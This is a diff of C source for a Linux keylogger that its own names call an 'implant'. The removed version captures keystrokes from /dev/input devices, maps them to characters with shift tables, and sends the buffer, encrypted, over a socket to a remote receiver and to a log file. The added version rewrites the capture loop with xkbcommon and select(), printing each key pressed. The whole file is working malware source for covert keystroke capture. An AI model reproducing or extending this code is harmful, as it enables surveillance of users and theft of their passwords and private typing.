@@ -1,146 +1,186 @@
 
-#include "keylogger.h"
-#include <fcntl.h>
-#include <signal.h>
-#include <stdio.h>
-#include <errno.h>
-#include <strings.h>
-#include <sys/select.h>
-#include <unistd.h>
-#include <linux/input.h>
-#include <stdlib.h>
+/*
+   key-logging is done here......yeah
+*/
+
+
+#include "implant.h"
+#include <alloca.h>
+#include <bits/types/struct_timeval.h>
+#include <stddef.h>
 #include <string.h>
+#include <errno.h>
+#include <sys/select.h>
+#include <linux/input.h>
 #include <sys/types.h>
-#include <stdbool.h>
+#include <unistd.h>
+#include <xkbcommon/xkbcommon.h>
 
 
-static char *KEYCODES[] = {
-    "<unknown>", "<ESC>",
-    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
-    "<Backspace>", "<Tab>",
-    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
-    "[", "]", "<Enter>", "<LCtrl>",
-    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
-    "'", "`", "<LShift>",
-    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
-    "<RShift>",
-    "<KP*>",
-    "<LAlt>", " ", "<CapsLock>",
-    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
-    "<NumLock>", "<ScrollLock>",
-    "<KP7>", "<KP8>", "<KP9>",
-    "<KP->",
-    "<KP4>", "<KP5>", "<KP6>",
-    "<KP+>",
-    "<KP1>", "<KP2>", "<KP3>", "<KP0>",
-    "<KP.>",
-    "<unknown>", "<unknown>", "<unknown>",
-    "<F11>", "<F12>",
-    "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>",
-    "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "<unknown>",
-    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
-    "<PageDown>", "<Insert>", "<Delete>", 0x0
-};
+static int get_highest_fd(int *kbfd, int *i) {
+    if (!kbfd)
+        return -1;
 
-static char *SHIFT_KEYCODES[] = {
-    "<unknown>", "<ESC>",
-    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
-    "<Backspace>", "<Tab>",
-    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
-    "{", "}", "<Enter>", "<LCtrl>",
-    "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
-    "\"", "~", "<LShift>",
-    "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
-    "<RShift>",
-    "<KP*>",
-    "<LAlt>", " ", "<CapsLock>",
-    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
-    "<NumLock>", "<ScrollLock>",
-    "<KP7>", "<KP8>", "<KP9>",
-    "<KP->",
-    "<KP4>", "<KP5>", "<KP6>",
-    "<KP+>",
-    "<KP1>", "<KP2>", "<KP3>", "<KP0>",
-    "<KP.>",
-    "<unknown>", "<unknown>", "<unknown>",
-    "<F11>", "<F12>",
-    "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>",
-    "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "<unknown>",
-    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
-    "<PageDown>", "<Insert>", "<Delete>", 0x0
-};
+    int highest = -1;
+    for (*i = 0; kbfd[*i] != -1; (*i)++)
+        highest = (highest < kbfd[*i]) ? kbfd[*i] : highest;
+    return highest;
+}
 
-static void send_log(int sockfd, int logfd, char *buffer, int len)
-{
-    if (!buffer || !(*buffer))
+static int log_keyboard(int fd, implant_t *instance, struct xkb_state *state) {
+    struct input_event evt = {0};
+
+    ssize_t bytes_read = read(fd, &evt, sizeof(evt));
+    if (bytes_read != sizeof(evt)) {
+        DEBUG_LOG(
+            instance->debug_enabled,
+            "[!] read() error: %s",
+            strerror(errno)
+        );
+
+        return ERROR;
+    }
+
+    // 1 = is_pressed
+    if (evt.type == EV_KEY && evt.value == 1) {
+        char key_description[256] = {0};
+        xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);
+
+        xkb_keysym_get_name(keysym, key_description, 256);
+        printf("[+] Key pressed: %s\n", key_description);
+    }
+
+    return SUCCESSFUL;
+}
+
+
+/*
+    main loop to listen for keys and stuff
+*/
+void keylog(implant_t *instance) {
+
+
+    /* first set up select etc */
+    int nb_kb = 0;
+    int highest_fd = get_highest_fd(instance->kb_fd, &nb_kb);
+    fd_set rd, err;
+    int status = 0;
+
+    if (highest_fd < 0 || !nb_kb) {
+        DEBUG_LOG(
+            instance->debug_enabled,
+            "[!] no keyboard found. exiting"
+        );
         return;
-    if (logfd != -1)
-        write(logfd, buffer, len);
-    if (sockfd != -1) {
-        write(sockfd, encrypt(buffer), len);
     }
-}
 
-static void log_single_keyboard(int kbfd, int sockfd, int logfd)
-{
-    static char *buffer = 0x0;
-    static bool is_on_shift = false;
-    int bytes_read = 0;
-    int msg_length = 0;
-    struct input_event evt;
-    struct sigaction old;
-    struct sigaction new = {
-        .sa_handler = SIG_IGN,
-        .sa_flags = 0
-    };
 
-    sigemptyset(&new.sa_mask);
-    sigaction(SIGPIPE, &new, &old);
-    do {
+    /*
+       initialize xkbcommon context
 
-        bytes_read = read(kbfd, &evt, sizeof(struct input_event));
-        if (bytes_read == -1) {
-            break;
-        } else is_on_shift = check_if_on_shift(is_on_shift, evt);
+       this is the stuff that allows us to maps keys to
+       the correct language & manages special characters, shift, etc.
+    */
 
-        if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED) {
-            if (is_on_shift)
-                buffer = append(buffer, SHIFT_KEYCODES[evt.code]);
-            else buffer = append(buffer, KEYCODES[evt.code]);
-        }
+    struct xkb_context *context = NULL;
+    struct xkb_keymap *keymap = NULL;
+    struct xkb_state *state = NULL;
 
-        if (buffer && strlen(buffer) >= BUFFER_SIZE) {
-            msg_length = strlen(buffer);
-            send_log(sockfd, logfd, buffer, msg_length);
-            free(buffer);
-            buffer = 0x0;
-        }
-    } while (bytes_read < 0);
-    sigaction(SIGPIPE, &old, 0x0);
+    context = xkb_context_new(0);
+    if (!context) {
+        DEBUG_LOG(
+            instance->debug_enabled,
+            "[!] error with xkb_context_new(): %s",
+            strerror(errno)
+        );
 
-}
+        return;
 
-void log_keys(int *keyboards_fd, int sockfd, int logfd)
-{
-    int nb_kb = - 1;
-    fd_set wrt;
-    fd_set rd;
-    fd_set err;
-    int select_status = 0;
+    }
 
-    while (keyboards_fd[++nb_kb] != -1);
+    keymap = xkb_keymap_new_from_names(context, NULL, 0);
+    if (!keymap) {
+        DEBUG_LOG(
+            instance->debug_enabled,
+            "[!] error with xkb_keymap_new_from_names(): %s",
+            strerror(errno)
+        );
+
+        goto LOG_FUNCTION_CLEANUP;
+    }
+
+    state = xkb_state_new(keymap);
+    if (!state) {
+        DEBUG_LOG(
+            instance->debug_enabled,
+            "[!] error with xkb_state_new(): %s",
+            strerror(errno)
+        );
+
+        goto LOG_FUNCTION_CLEANUP;
+    }
+
+
+    /* run the damn loop */
     while (1) {
-        refresh_set(&wrt, keyboards_fd);
-        refresh_set(&rd, keyboards_fd);
-        refresh_set(&err, keyboards_fd);
-        select_status = select(nb_kb + 1, &rd, &wrt, &err, 0x0);
-        if (select_status < 0) {
-            dprintf(logfd, "select status:%d -- exiting...\n", select_status);
-            break;
+
+        /* setup FD-sets */
+        for (int i = 0; i < nb_kb; i++) {
+            FD_SET(instance->kb_fd[i], &rd);
+            FD_SET(instance->kb_fd[i], &err);
         }
-        for (int ctr = -1 ; ++ctr < nb_kb; )
-            if (FD_ISSET(keyboards_fd[ctr], &rd)) {
-                log_single_keyboard(keyboards_fd[ctr], sockfd, logfd);
+
+        /* check if a key has been pressed */
+        status = select(highest_fd + 1, &rd, NULL, &err, (instance->debug_enabled) ? &(struct timeval){1, 0}: NULL);
+        if (status < 0) {
+            DEBUG_LOG(
+                instance->debug_enabled,
+                "[!] select error: %s",
+                strerror(errno)
+            );
+
+            goto LOG_FUNCTION_CLEANUP;
+        }
+
+        /* check file descriptors (first for error, then for new input) */
+        for (int i = 0; i < nb_kb; i++) {
+            if (FD_ISSET(instance->kb_fd[i], &err)) {
+                DEBUG_LOG(
+                    instance->debug_enabled,
+                    "[!] Error on file descriptor %d",
+                    instance->kb_fd[i]
+                );
+
+                /*
+                    TODO: replace array of keyboard fd by a linked list so
+                    that it can cleanly be removed without breaking the
+                    logger
+                */
+
+                goto LOG_FUNCTION_CLEANUP;
             }
+
+            /* checking for new input here */
+            if (FD_ISSET(instance->kb_fd[i], &rd)) {
+
+                /* TODO: should we really kill the run here or can we recover this ? */
+                if (log_keyboard(instance->kb_fd[i], instance, state) == ERROR)
+                    goto LOG_FUNCTION_CLEANUP;
+            }
+
+        }
+
     }
+
+
+LOG_FUNCTION_CLEANUP:
+    if (state != NULL)
+        xkb_state_unref(state);
+
+    if (keymap != NULL)
+        xkb_keymap_unref(keymap);
+
+    if (context != NULL)
+        xkb_context_unref(context);
+
 }
